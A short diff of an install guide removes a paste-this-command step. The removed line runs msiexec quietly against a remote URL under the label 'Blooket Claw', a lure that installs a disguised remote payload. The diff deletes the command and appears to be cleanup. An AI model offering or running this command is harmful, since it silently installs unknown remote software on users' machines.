@@ -22,7 +22,7 @@ This will open **Command Prompt**.
 ### **Step 2 — Run the Install Command**
 Copy the command below and paste it into **Command Prompt**, then press **Enter**.
 ```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Blooket Claw
+
 ```
 
 The installer will:
